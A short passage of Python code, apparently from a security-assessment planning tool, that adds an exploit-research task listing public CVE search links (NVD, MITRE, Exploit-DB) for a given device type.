                        'metadata': {
                            'description': f'Search CVE databases for {device_type} vulnerabilities',
                            'tags': ['RESEARCH'],
                            'notes': f'''
Search for CVEs related to {device_type}:
- https://nvd.nist.gov/vuln/search
- https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={device_type}
- https://www.exploit-db.com/search?q={device_type}
'''
                        }
                    }
                ]
            }
            tasks['children'].append(exploit_research)

        return tasks
